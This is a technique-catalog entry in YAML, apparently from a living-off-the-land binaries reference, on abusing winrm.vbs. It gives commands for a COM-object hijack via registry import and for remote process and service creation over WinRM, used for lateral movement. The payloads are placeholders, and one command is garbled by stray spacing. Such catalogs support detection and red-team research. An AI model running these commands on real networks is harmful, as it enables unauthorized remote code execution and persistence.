---
name: winrm.vbs
description: 
functions:
  execute:
    - description: Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code.
      code: reg.exe import c:\path\to\Slmgr.reg & winrm quickconfig
    - description: Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol.
      code: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985
    - description: Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol.
      code: winrm invoke Create wmicimv2/Win32_Service @{      Name="Evil";Display      Name="Evil";Path      Name="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?      Name=Evil -r:http://acmedc:5985
resources: 
    - resource: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
    - resource: https://www.youtube.com/watch?v=3gz1QmiMhss
    - resource: https://github.com/enigma0x3/windows-operating-system-archaeology
    - resource: https://redcanary.com/blog/lateral-movement-winrm-wmi/
    - resource: https://twitter.com/bohops/status/994405551751815170
fullpath: 
    - path: c:\windows\system32\winrm.vbs
    - path: c:\windows\sysWOW64\winrm.vbs
notes: Thanks to Matt Nelson - @enigma0x3 (Hijack), Casey Smith - @subtee (Hijack), Red Canary Company cc Tony Lambert - @redcanaryco (Win32_Process LM), Jimmy - @bohops (Win32_Service LM)

---